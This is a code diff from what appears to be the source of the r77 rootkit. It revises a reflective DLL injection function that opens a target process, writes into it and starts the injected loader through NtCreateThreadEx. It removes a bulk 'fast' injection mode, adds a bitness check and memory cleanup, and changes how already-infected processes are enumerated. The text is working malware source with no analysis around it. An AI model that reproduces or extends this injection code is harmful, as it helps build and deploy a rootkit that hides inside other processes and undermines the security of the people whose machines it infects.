@@ -4,13 +4,13 @@
 #include <Shlwapi.h>
 #include <Psapi.h>
 
-BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
+BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize)
 {
 	BOOL result = FALSE;
 
-	// Unlike with "regular" DLL injection, the bitness must be checked explicitly.
-	BOOL is64Bit;
-	if (Is64BitProcess(processId, &is64Bit) && BITNESS(is64Bit ? 64 : 32))
+	// The bitness of the process must match the bitness of the DLL, otherwise the process will crash.
+	BOOL isProcess64Bit, isDll64Bit;
+	if (Is64BitProcess(processId, &isProcess64Bit) && IsExecutable64Bit(dll, &isDll64Bit) && isProcess64Bit == isDll64Bit)
 	{
 		HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, processId);
 		if (process)
@@ -53,13 +53,7 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 									HANDLE thread = NULL;
 									if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, allocatedMemory + entryPoint, allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
 									{
-										if (fast)
-										{
-											// Fast mode is for bulk operations, where the return value of this function is ignored.
-											// The return value of DllMain is not checked. This function just returns TRUE, if NtCreateThreadEx succeeded.
-											result = TRUE;
-										}
-										else if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
+										if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
 										{
 											// Return TRUE, only if DllMain returned TRUE.
 											// DllMain returns FALSE, for example, if r77 is already injected.
@@ -67,6 +61,12 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 											if (GetExitCodeThread(thread, &exitCode))
 											{
 												result = exitCode != 0;
+											}
+
+											// The reflective loader will no longer need the DLL file.
+											if (!VirtualFreeEx(process, allocatedMemory, 0, MEM_RELEASE))
+											{
+												result = FALSE;
 											}
 										}
 
@@ -106,7 +106,7 @@ BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count)
 			HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
 			if (process)
 			{
-				if (EnumProcessModules(process, modules, 10000 * sizeof(HMODULE), &moduleCount))
+				if (EnumProcessModulesEx(process, modules, 10000 * sizeof(HMODULE), &moduleCount, LIST_MODULES_ALL))
 				{
 					moduleCount /= sizeof(HMODULE);
 
